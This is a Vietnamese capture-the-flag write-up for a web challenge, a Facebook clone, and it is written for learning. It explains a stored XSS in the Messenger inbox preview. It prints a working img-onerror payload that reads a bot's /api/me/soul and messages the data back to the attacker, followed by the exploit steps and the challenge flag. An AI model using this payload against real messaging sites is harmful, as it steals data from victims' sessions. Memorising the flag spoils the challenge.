# facebook

**Category:** Web

## Đề bài

> lương tâm của bạn có cho phép bạn đánh đổi soul để lấy flag? soul của bạn nằm ở `/api/me/soul` — `103.116.52.180:1710`

Trang là một clone Facebook ("facebooks" / DevilBook).

## Recon

- Đăng ký tài khoản, `/api/me/soul` trả về soul của chính mình.
- Trang `/devil-contract` ("Giao dịch với Bùi Huy"): yêu cầu **dâng 10 linh hồn khác nhau**, kèm **contract_key của mình**. Có 3 API: `/api/devil/submit`, `/api/devil/progress`, `/api/devil/flag`.
- Nộp soul của chính mình → *"Linh hồn của chính ngươi thì vô giá trị"*. Nộp soul tài khoản người chơi khác → *"Linh hồn này rỗng tuếch"*. Chỉ các **tài khoản bot** được seed sẵn (luna_hex, vera_nyx, ... — 15 bot) mới có linh hồn "thực sự".

Muốn lấy soul của bot thì phải lấy trong **phiên của chính bot** (vì mỗi tài khoản không tự nộp được soul của mình).

## Lỗ hổng: Stored XSS trong Messenger

`static/js/common.js` ghi chú thẳng rằng nơi duy nhất render dữ liệu người dùng bằng `innerHTML` là **ô preview inbox của Messenger** ([`files/messages.js`](./files/messages.js)):

```js
// === Inbox preview: intentional innerHTML sink (renders last message as HTML) ===
preview.innerHTML = (conv.last_from_me ? 'You: ' : '') + (conv.last_message || '');
```

Tin nhắn cuối của mỗi hội thoại được render dưới dạng HTML. Gửi cho bot một tin chứa `<img onerror=...>` thì khi bot mở inbox, payload chạy **trong phiên của bot**.

## Khai thác

Gửi cho mỗi bot một DM:

```html
<img src=x onerror="fetch('/api/me/soul').then(r=>r.json()).then(d=>
  fetch('/api/messages/send',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({to:'<me>',content:'SOUL '+d.username+' '+d.soul})}))">
```

Khi bot xem inbox, `<img>` lỗi → `onerror` chạy: lấy `/api/me/soul` của **bot** rồi DM ngược lại cho mình chuỗi `SOUL <bot> <soul>`. (Nên thêm guard `localStorage` để mỗi bot chỉ bắn 1 lần; dùng key riêng vì key phổ biến có thể đã bị người chơi khác set.)

Sau đó:
1. Poll `/api/messages/conversations`, gom ≥ 10 soul từ các tin trả về.
2. `POST /api/devil/submit` từng soul với `contract_key` của mình cho tới khi `/api/devil/progress` ≥ 10.
3. `GET /api/devil/flag`.

Script: [`solve.py`](./solve.py)

```
$ curl .../api/devil/flag   (sau khi progress = 13/10)
{"ok":true,"flag":"miniCTF{xss_messenger_soul_contract}"}
```

## Flag

```
miniCTF{xss_messenger_soul_contract}
```
